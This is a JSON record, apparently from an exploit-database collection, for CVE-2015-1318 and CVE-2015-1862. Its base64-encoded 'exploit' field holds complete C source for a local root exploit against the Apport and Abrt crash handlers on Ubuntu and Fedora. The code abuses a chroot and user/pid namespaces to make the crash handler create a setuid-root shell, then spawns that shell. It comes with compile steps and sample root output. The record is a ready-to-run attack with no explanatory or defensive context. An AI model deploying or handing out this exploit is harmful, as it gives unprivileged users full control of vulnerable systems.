{
    "source": "exploit-database", 
    "exploit": "I2RlZmluZSBfR05VX1NPVVJDRQ0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxzaWduYWwuaD4NCiNpbmNsdWRlIDxlbGYuaD4NCiNpbmNsdWRlIDxlcnIuaD4NCiNpbmNsdWRlIDxzeXNsb2cuaD4NCiNpbmNsdWRlIDxzY2hlZC5oPg0KI2luY2x1ZGUgPGxpbnV4L3NjaGVkLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNsdWRlIDxzeXMvYXV4di5oPg0KI2luY2x1ZGUgPHN5cy93YWl0Lmg+DQoNCiMgd2FybmluZyB0aGlzIGZpbGUgbXVzdCBiZSBjb21waWxlZCB3aXRoIC1zdGF0aWMNCg0KLy8NCi8vIEFwcG9ydC9BYnJ0IFZ1bG5lcmFiaWxpdHkgRGVtbyBFeHBsb2l0Lg0KLy8NCi8vICBBcHBvcnQ6IENWRS0yMDE1LTEzMTgNCi8vICBBYnJ0OiAgIENWRS0yMDE1LTE4NjINCi8vIA0KLy8gICAtLSB0YXZpc29AY21weGNoZzhiLmNvbSwgQXByaWwgMjAxNS4NCi8vDQovLyAkIGdjYyAtc3RhdGljIG5ld3BpZC5jDQovLyAkIC4vYS5vdXQNCi8vIHVpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpDQovLyBzaC00LjMjIGV4aXQNCi8vIGV4aXQNCi8vDQovLyBIaW50OiBUbyBnZXQgbGliYy5hLA0KLy8gIHl1bSBpbnN0YWxsIGdsaWJjLXN0YXRpYyBvciBhcHQtZ2V0IGluc3RhbGwgbGliYzYtZGV2DQovLw0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpDQp7DQogICAgaW50IHN0YXR1czsNCiAgICBFbGYzMl9QaGRyICpoZHI7DQogICAgcGlkX3Qgd3JhcHBlcjsNCiAgICBwaWRfdCBpbml0Ow0KICAgIHBpZF90IHN1YnByb2Nlc3M7DQogICAgdW5zaWduZWQgaTsNCg0KICAgIC8vIFZlcmlmeSB0aGlzIGlzIGEgc3RhdGljIGV4ZWN1dGFibGUgYnkgY2hlY2tpbmcgdGhlIHByb2dyYW0gaGVhZGVycyBmb3IgYQ0KICAgIC8vIGR5bmFtaWMgc2VnbWVudC4gT3JpZ2luYWxseSBJIHRob3VnaHQganVzdCBjaGVja2luZyBBVF9CQVNFIHdvdWxkIHdvcmssDQogICAgLy8gYnV0IHRoYXQgaXNudCByZWxpYWJsZSBhY3Jvc3MgbWFueSBrZXJuZWxzLg0KICAgIGhkciA9ICh2b2lkICopIGdldGF1eHZhbChBVF9QSERSKTsNCg0KICAgIC8vIElmIHdlIGZpbmQgYW55IFBUX0RZTkFNSUMsIHRoZW4gdGhpcyBpcyBwcm9iYWJseSBub3QgYSBzdGF0aWMgYmluYXJ5Lg0KICAgIGZvciAoaSA9IDA7IGkgPCBnZXRhdXh2YWwoQVRfUEhOVU0pOyBpKyspIHsNCiAgICAgICAgaWYgKGhkcltpXS5wX3R5cGUgPT0gUFRfRFlOQU1JQykgew0KICAgICAgICAgICAgZXJyeChFWElUX0ZBSUxVUkUsICJ5b3UgKm11c3QqIGNvbXBpbGUgd2l0aCAtc3RhdGljIik7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvLyBJZiBleGVjdXRpb24gcmVhY2hlZCBoZXJlLCBpdCBsb29rcyBsaWtlIHdlJ3JlIGEgc3RhdGljIGV4ZWN1dGFibGUuIElmDQogICAgLy8gSSdtIHJvb3QsIHRoZW4gd2UndmUgY29udmluY2VkIHRoZSBjb3JlIGhhbmRsZXIgdG8gcnVuIHVzLCBzbyBjcmVhdGUgYQ0KICAgIC8vIHNldHVpZCByb290IGV4ZWN1dGFibGUgdGhhdCBjYW4gYmUgdXNlZCBvdXRzaWRlIHRoZSBjaHJvb3QuDQogICAgaWYgKGdldHVpZCgpID09IDApIHsNCiAgICAgICAgaWYgKGNob3duKCJzaCIsIDAsIDApICE9IDApDQogICAgICAgICAgICBleGl0KEVYSVRfRkFJTFVSRSk7DQoNCiAgICAgICAgaWYgKGNobW9kKCJzaCIsIDA0NzU1KSAhPSAwKQ0KICAgICAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOw0KDQogICAgICAgIHJldHVybiBFWElUX1NVQ0NFU1M7DQogICAgfQ0KDQogICAgLy8gSWYgSSdtIG5vdCByb290LCBidXQgZXVpZCBpcyAwLCB0aGVuIHRoZSBleHBsb2l0IHdvcmtlZCBhbmQgd2UgY2FuIHNwYXduDQogICAgLy8gYSBzaGVsbCBhbmQgY2xlYW51cC4NCiAgICBpZiAoc2V0dWlkKDApID09IDApIHsNCiAgICAgICAgc3lzdGVtKCJpZCIpOw0KICAgICAgICBzeXN0ZW0oInJtIC1yZiBleHBsb2l0Iik7DQogICAgICAgIGV4ZWNscCgic2giLCAic2giLCBOVUxMKTsNCg0KICAgICAgICAvLyBTb21ldGhpbmcgd2VudCB3cm9uZy4NCiAgICAgICAgZXJyKEVYSVRfRkFJTFVSRSwgImZhaWxlZCB0byBzcGF3biByb290IHNoZWxsLCBidXQgZXhwbG9pdCB3b3JrZWQiKTsNCiAgICB9DQoNCiAgICAvLyBJdCBsb29rcyBsaWtlIHRoZSBleHBsb2l0IGhhc24ndCBydW4geWV0LCBzbyBjcmVhdGUgYSBjaHJvb3QuDQogICAgaWYgKG1rZGlyKCJleHBsb2l0IiwgMDc1NSkgIT0gMA0KICAgICB8fCBta2RpcigiZXhwbG9pdC91c3IiLCAwNzU1KSAhPSAwDQogICAgIHx8IG1rZGlyKCJleHBsb2l0L3Vzci9zaGFyZSIsIDA3NTUpICE9IDANCiAgICAgfHwgbWtkaXIoImV4cGxvaXQvdXNyL3NoYXJlL2FwcG9ydCIsIDA3NTUpICE9IDANCiAgICAgfHwgbWtkaXIoImV4cGxvaXQvdXNyL2xpYmV4ZWMiLCAwNzU1KSAhPSAwKSB7DQogICAgICAgIGVycihFWElUX0ZBSUxVUkUsICJmYWlsZWQgdG8gY3JlYXRlIGNocm9vdCBkaXJlY3RvcnkiKTsNCiAgICB9DQoNCiAgICAvLyBDcmVhdGUgbGlua3MgdG8gdGhlIGV4cGxvaXQgbG9jYXRpb25zIHdlIG5lZWQuDQogICAgaWYgKGxpbmsoKmFyZ3YsICJleHBsb2l0L3NoIikgIT0gMA0KICAgICB8fCBsaW5rKCphcmd2LCAiZXhwbG9pdC91c3Ivc2hhcmUvYXBwb3J0L2FwcG9ydCIpICE9IDAgICAgICAgIC8vIFVidW50dQ0KICAgICB8fCBsaW5rKCphcmd2LCAiZXhwbG9pdC91c3IvbGliZXhlYy9hYnJ0LWhvb2stY2NwcCIpICE9IDApIHsgIC8vIEZlZG9yYQ0KICAgICAgICBlcnIoRVhJVF9GQUlMVVJFLCAiZmFpbGVkIHRvIGNyZWF0ZSByZXF1aXJlZCBoYXJkIGxpbmtzIik7DQogICAgfQ0KDQogICAgLy8gQ3JlYXRlIGEgc3VicHJvY2VzcyBzbyB3ZSBkb24ndCBlbnRlciB0aGUgbmV3IG5hbWVzcGFjZS4NCiAgICBpZiAoKHdyYXBwZXIgPSBmb3JrKCkpID09IDApIHsNCg0KICAgICAgICAvLyBJbiB0aGUgY2hpbGQgcHJvY2VzcywgY3JlYXRlIGEgbmV3IHBpZCBhbmQgdXNlciBucy4gVGhlIHBpZA0KICAgICAgICAvLyBuYW1lc3BhY2UgaXMgb25seSBuZWVkZWQgb24gVWJ1bnR1LCBiZWNhdXNlIHRoZXkgY2hlY2sgZm9yICVQICE9ICVwDQogICAgICAgIC8vIGluIHRoZWlyIGNvcmUgaGFuZGxlci4gT24gRmVkb3JhLCBqdXN0IGEgdXNlciBucyBpcyBzdWZmaWNpZW50Lg0KICAgICAgICBpZiAodW5zaGFyZShDTE9ORV9ORVdQSUQgfCBDTE9ORV9ORVdVU0VSKSAhPSAwKQ0KICAgICAgICAgICAgZXJyKEVYSVRfRkFJTFVSRSwgImZhaWxlZCB0byBjcmVhdGUgbmV3IG5hbWVzcGFjZSIpOw0KDQogICAgICAgIC8vIENyZWF0ZSBhIHByb2Nlc3MgaW4gdGhlIG5ldyBuYW1lc3BhY2UuDQogICAgICAgIGlmICgoaW5pdCA9IGZvcmsoKSkgPT0gMCkgew0KDQogICAgICAgICAgICAvLyBJbml0IChwaWQgMSkgc2lnbmFsIGhhbmRsaW5nIGlzIHNwZWNpYWwsIHNvIG1ha2UgYSBzdWJwcm9jZXNzIHRvDQogICAgICAgICAgICAvLyBoYW5kbGUgdGhlIHRyYXBzLg0KICAgICAgICAgICAgaWYgKChzdWJwcm9jZXNzID0gZm9yaygpKSA9PSAwKSB7DQogICAgICAgICAgICAgICAgLy8gQ2hhbmdlIC9wcm9jL3NlbGYvcm9vdCwgd2hpY2ggd2UgY2FuIGRvIGFzIHdlJ3JlIHByaXZpbGVnZWQNCiAgICAgICAgICAgICAgICAvLyB3aXRoaW4gdGhlIG5ldyBuYW1lcGFjZS4NCiAgICAgICAgICAgICAgICBpZiAoY2hyb290KCJleHBsb2l0IikgIT0gMCkgew0KICAgICAgICAgICAgICAgICAgICBlcnIoRVhJVF9GQUlMVVJFLCAiY2hyb290IGRpZG50IHdvcmsiKTsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAvLyBOb3cgdHJhcCB0byBnZXQgdGhlIGNvcmUgaGFuZGxlciBpbnZva2VkLg0KICAgICAgICAgICAgICAgIF9fYnVpbHRpbl90cmFwKCk7DQoNCiAgICAgICAgICAgICAgICAvLyBTaG91bGRuJ3QgaGFwcGVuLCB1bmxlc3MgdXNlciBpcyBwdHJhY2luZyB1cyBvciBzb21ldGhpbmcuDQogICAgICAgICAgICAgICAgZXJyKEVYSVRfRkFJTFVSRSwgImNvcmVkdW1wIGZhaWxlZCwgd2VyZSB5b3UgcHRyYWNpbmc/Iik7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIElmIHRoZSBzdWJwcm9jZXNzIGV4aXRlZCB3aXRoIGFuIGFibm9ybWFsIHNpZ25hbCwgdGhlbiBldmVyeXRoaW5nIHdvcmtlZC4NCiAgICAgICAgICAgIGlmICh3YWl0cGlkKHN1YnByb2Nlc3MsICZzdGF0dXMsIDApID09IHN1YnByb2Nlc3MpICAgIA0KICAgICAgICAgICAgICAgIHJldHVybiBXSUZTSUdOQUxFRChzdGF0dXMpDQogICAgICAgICAgICAgICAgICAgICAgICA/IEVYSVRfU1VDQ0VTUw0KICAgICAgICAgICAgICAgICAgICAgICAgOiBFWElUX0ZBSUxVUkU7DQoNCiAgICAgICAgICAgIC8vIFNvbWV0aGluZyBkaWRuJ3Qgd29yay4NCiAgICAgICAgICAgIHJldHVybiBFWElUX0ZBSUxVUkU7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBUaGUgbmV3IG5hbWVzcGFjZSBkaWRuJ3Qgd29yay4NCiAgICAgICAgaWYgKHdhaXRwaWQoaW5pdCwgJnN0YXR1cywgMCkgPT0gaW5pdCkNCiAgICAgICAgICAgIHJldHVybiBXSUZFWElURUQoc3RhdHVzKSAmJiBXRVhJVFNUQVRVUyhzdGF0dXMpID09IEVYSVRfU1VDQ0VTUw0KICAgICAgICAgICAgICAgICAgICA/IEVYSVRfU1VDQ0VTUw0KICAgICAgICAgICAgICAgICAgICA6IEVYSVRfRkFJTFVSRTsNCg0KICAgICAgICAvLyBXYWl0cGlkIGZhaWx1cmUuDQogICAgICAgIHJldHVybiBFWElUX0ZBSUxVUkU7DQogICAgfQ0KDQogICAgLy8gSWYgdGhlIHN1YnByb2Nlc3MgcmV0dXJuZWQgc2NjZXNzLCB0aGUgZXhwbG9pdCBwcm9iYWJseSB3b3JrZWQsIHJlbG9hZA0KICAgIC8vIHdpdGggZXVpZCB6ZXJvLg0KICAgIGlmICh3YWl0cGlkKHdyYXBwZXIsICZzdGF0dXMsIDApID09IHdyYXBwZXIpIHsNCiAgICAgICAgLy8gQWxsIGRvbmUsIHNwYXduIHJvb3Qgc2hlbGwuDQogICAgICAgIGlmIChXSUZFWElURUQoc3RhdHVzKSAmJiBXRVhJVFNUQVRVUyhzdGF0dXMpID09IDApIHsNCiAgICAgICAgICAgIGV4ZWNsKCphcmd2LCAidzAwdCIsIE5VTEwpOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgLy8gVW5rbm93biBlcnJvci4NCiAgICBlcnJ4KEVYSVRfRkFJTFVSRSwgInVuZXhwZWN0ZWQgcmVzdWx0LCBjYW5ub3QgY29udGludWUiKTsNCn0=", 
    "filename": "platforms/linux/local/36746.c", 
    "id": "36746", 
    "cves": [
        "CVE-2015-1318", 
        "CVE-2015-1862"
    ]
}